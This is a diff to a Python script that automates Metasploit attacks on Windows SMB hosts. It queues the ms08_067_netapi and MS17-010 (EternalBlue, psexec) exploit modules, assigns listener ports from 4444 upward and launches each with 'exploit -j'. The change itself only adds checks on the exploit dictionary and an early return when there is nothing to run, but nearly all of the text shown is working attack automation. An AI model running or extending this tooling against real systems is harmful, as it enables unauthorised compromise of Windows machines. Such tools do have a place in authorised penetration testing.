@@ -3,9 +3,15 @@ import json
 import subprocess
 import sys
 
+_exploit_dict_structure = ['ms08-067', 'ms17-010-psexec', 'ms17-010-eternalblue']
+
 def handle_exploitation(exploit_dict, start_port=4444, lhost=None):
     port = start_port  # Necessary because this becomes multithreaded
     commands = []  # List of commands to execute in metasploit
+
+    assert len(exploit_dict) == len(_exploit_dict_structure)
+    for k in _exploit_dict_structure:
+        assert k in exploit_dict
 
     if len(exploit_dict['ms08-067']) > 0:
         commands.append('use exploit/windows/smb/ms08_067_netapi')
@@ -41,6 +47,9 @@ def handle_exploitation(exploit_dict, start_port=4444, lhost=None):
             commands.append('set lport {0}'.format(port))
             port += 1
             commands.append('exploit -j')
+
+    if len(commands) == 0:
+        return None
 
     # Reinit the db so that its up and clean (might change this to be smarter)
     subprocess.run(['msfdb', 'reinit'])
